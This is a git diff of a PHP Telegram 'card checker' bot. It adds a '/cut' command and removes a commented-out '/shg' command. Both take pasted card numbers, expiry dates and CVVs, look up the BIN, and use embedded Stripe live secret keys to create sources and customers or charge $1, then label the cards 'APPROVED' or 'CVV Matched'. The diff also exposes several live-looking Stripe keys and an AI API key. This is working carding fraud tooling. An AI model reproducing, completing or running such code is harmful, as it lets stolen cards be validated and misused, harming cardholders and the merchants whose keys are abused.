@@ -110,7 +110,7 @@ elseif (strpos($message, "/ran") === 0){
  //////////=========[Status Command]=========//////////
 
 elseif (strpos($message, "/sta") === 0){
-  sendMessage($chatId, "<b>/aut:</b>ON✅%0A<b>/chg:</b>⚠️NOT ENABLED%0A<b>/ccn:</b>❌GATE DEAD%0A<b>/agt:</b>ON✅%0A<b>/rap:</b>❌GATE DEAD%0A<b>/kcc:</b>❌GATE DEAD", $message_id);
+  sendMessage($chatId, "<b>/aut:</b>ON ✅%0A<b>/cut:</b>ON ✅%0A<b>/chg:</b>GATE DEAD ❌%0A<b>/ccn:</b>GATE DEAD ❌%0A<b>/agt:</b>ON✅%0A<b>/rap:</b>GATE DEAD ❌%0A<b>/scg:</b>GATE DEAD ❌%0A<b>/kcc:</b>GATE DEAD ❌", $message_id);
  }
 //////////=========[Random Info]=========//////////
 
@@ -209,19 +209,19 @@ curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'Content-Type: application/json',
-    'Authorization: Bearer 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'
+    'Authorization: Bearer sk-XZJtVHGdmH436EkRHLyviZMtSjodB4gByQJwyYxPmBE1xI1QJOniu'
 ));
 $response = curl_exec($ch);
 $response = json_decode($response, true);
 $result = $response['choices'][0]['text'];
-$text = trim($result);
+$text1 = trim($result);
 
-sendMessage($chatId, "$text", $message_id);
+sendMessage($chatId, "$text1", $message_id);
 }
 //////////=========[aut Command]=========//////////
 elseif (strpos($message, "/aut") === 0){
   $skeys = array(
-      1 => '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', // Enter at least one sk key
+      1 => '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', // Enter at least one sk key
     //2 => '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',-----------------|
     //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
     //4 => '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',                 |
@@ -379,115 +379,171 @@ $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
             sendLog($chatId, "<b>BUG REPORTED /aut</b>%0A <b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
             }
           }
-//////////=========[shg Command]=========//////////
-// elseif (strpos($message, "/shg") === 0){
-   
-// $message = substr($message, 5);
-// $sk = multiexplode(array("/", ":", " ", "|"), $message)[0];
-// $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
-// $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
-// $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
-// $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
-// if (empty($sk)) {
-// $sk = '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';
-// }
-//         $amount = $amt * 100;
-//         $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
-//         $ch = curl_init();
-//         curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
-//         curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-//         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-//         'Host: lookup.binlist.net',
-//         'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
-//         'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
-//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-//         curl_setopt($ch, CURLOPT_POSTFIELDS, '');
-//         $fim = curl_exec($ch);
-//         $bank = GetStr($fim, '"bank":{"name":"', '"');
-//         $name = GetStr($fim, '"name":"', '"');
-//         $brand = GetStr($fim, '"brand":"', '"');
-//         $country = GetStr($fim, '"country":{"name":"', '"');
-//         $emoji = GetStr($fim, '"emoji":"', '"');
-//         $scheme = GetStr($fim, '"scheme":"', '"');
-//         $type = GetStr($fim, '"type":"', '"');
-//         if(strpos($fim, '"type":"credit"') !== false){
-//         $bin = 'Credit';
-//         }else{
-//         $bin = 'Debit';
-//         };
-//         $ch = curl_init();
-//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
-//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-//         curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
-//         $result1 = curl_exec($ch);
-//         $tok1 = Getstr($result1,'"id": "','"');
-//         $msg1 = Getstr($result1,'"message": "','"');
-//         $ch = curl_init();
-//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
-//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-//         curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
-//         $result2 = curl_exec($ch);
-//         $tok2 = Getstr($result2,'"id": "','"');
-//         $msg2 = Getstr($result2,'"message": "','"');
-//         $ch = curl_init();
-//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
-//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-//         curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&customer='.$tok2.'');
-//         $result3 = curl_exec($ch);
-//         $msg2 = Getstr($result3,'"message": "','"');
-//         $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
-//         if(strpos($result3, '"seller_message": "Payment complete."' )) {
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Successfully Charged ₹$amt ✅</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b>%0A<b>RECEPIT URL -» $rcp </b>%0A @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-//         }
-//         elseif(strpos($result2, "insufficient_funds" )) {
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Insufficient Funds</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3D Card</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         elseif(strpos($result2,'"cvc_check": "pass"')){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         elseif(strpos($result2,'"code": "incorrect_cvc"')){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe charge 1$</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         elseif(strpos($result1,'"code": "incorrect_cvc"')){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         elseif ((strpos($result3, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe charge 1$</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         elseif ((strpos($result3, "fraudulent")) || (strpos($result2, "fraudulent"))){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         elseif ((strpos($result3, "expired_card")) || (strpos($result2, "expired_card"))){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         elseif ((strpos($result3, "generic_declined")) || (strpos($result2, "generic_declined"))){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-//         }
-//         elseif ((strpos($result3, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         elseif ((strpos($result2, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-        
-//         elseif ((strpos($result3, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
-//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-//         else {
-//         sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
-//         };
+//////////=========[cut Command]=========//////////
+elseif (strpos($message, "/cut") === 0){
+  $skeys = array(
+      1 => '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', // Enter at least one sk key
+    //2 => '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',-----------------|
+    //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
+    //4 => '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',                 |
+    //5 => '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',-----------------|
+    ); 
+    $skey = array_rand($skeys);
+    $sk = $skeys[$skey];
 
-//     }
-    //////////=========[chg Command]=========//////////
+
+
+$message = substr($message, 4);
+$amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
+$cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
+$mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
+$yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
+$cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
+          $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
+          $ch = curl_init();
+          curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+          curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+          'Host: lookup.binlist.net',
+          'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+          $fim = curl_exec($ch);
+          $bank = GetStr($fim, '"bank":{"name":"', '"');
+          $name = GetStr($fim, '"name":"', '"');
+          $brand = GetStr($fim, '"brand":"', '"');
+          $country = GetStr($fim, '"country":{"name":"', '"');
+          $emoji = GetStr($fim, '"emoji":"', '"');
+          $scheme = GetStr($fim, '"scheme":"', '"');
+          $type = GetStr($fim, '"type":"', '"');
+          if(strpos($fim, '"type":"credit"') !== false){
+          $bin = 'Credit';
+          }else{
+          $bin = 'Debit';
+          };
+          $ch = curl_init();
+          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
+          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+          curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
+          $result1 = curl_exec($ch);
+          $tok1 = Getstr($result1,'"id": "','"');
+          $msg1 = Getstr($result1,'"message": "','"');
+          $msg1a = Getstr($result1,'"decline_code": "','"');
+          if(strpos($result1, "card_error")){
+            sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Respone 2 -» $msg1a </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if (strpos($result1, "card_declined")){
+            sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Respone 2 -» $msg1a </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if (strpos($result1, "rate_limit")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe CCN auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if (strpos($result1, "invalid_cvc")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if (strpos($result1, "sources_required_type_param")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if (strpos($result1, "testmode_charges_only")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'invalid_expiry_year'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» EXPRIED CARD ❌</b>%0A<b>Response -» invalid_expiry_year </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'invalid_expiry_month'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» EXPRIED CARD ❌</b>%0A<b>Response -» invalid_expiry_month </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'incorrect_number'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» INVALID CARD ❌</b>%0A<b>Response -» Incorrect number </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+
+          $ch = curl_init();
+          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
+          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+          curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
+          $result2 = curl_exec($ch);
+          $tok2 = Getstr($result2,'"id": "','"');
+          $msg2 = Getstr($result2,'"message": "','"');
+          $msg2a = Getstr($result1,'"decline_code": "','"');
+          if(strpos($result2, "card_error")){
+            sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Respone 2 -» $msg2a </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if (strpos($result2, "card_declined")){
+            sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Respone 2 -» $msg2a </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if (strpos($result2, "rate_limit")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if (strpos($result2, "invalid_account")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» CALL ISUSSER  </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if (strpos($result1, "invalid_cvc")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if (strpos($result1, "sources_required_type_param")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$tok2.'/sources/'.$tok1.'');
+          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+          $result3 = curl_exec($ch);
+          $msg3 = Getstr($result3,'"message": "','"');
+          $msg3a = Getstr($result1,'"decline_code": "','"');
+          if(strpos($result3, '"cvc_check": "pass"' )) {
+          sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0A%0A---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+          }
+          if(strpos($result3, '"id"' )) {
+            sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0A%0A---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+            }
+          if(strpos($result3, '"cvc_check": "fail"' )) {
+          sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» YOUR CARD WAS DECLINED BY ISUSING BANK ❌</b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0<b>Respone 2 -» $msg3a </b>%0A%0A---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+          }
+          if (strpos($result3, "rate_limit")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe CCN auth v2</b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          else {
+            sendMessage($chatId, "<b>SERVER ERROR</b>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
+            sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
+            sendLog($chatId, "<b>BUG REPORTED /aut</b>%0A <b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
+            }
+          }
+//////////=========[chg Command]=========//////////
     elseif (strpos($message, "/chg") === 0){
         $skeys = array(
-            1 => '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', // Enter at least one sk key
+            1 => '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', // Enter at least one sk key
           //2 => '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',-----------------|
           //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
           //4 => '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',                 |
@@ -674,133 +730,133 @@ $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
                 }
               }
 //////////=========[dir Command]=========//////////
-    elseif (strpos($message, "/dir") === 0){
-      $skeys = array(
-          1 => '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', // Enter at least one sk key
-        //2 => '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',-----------------|
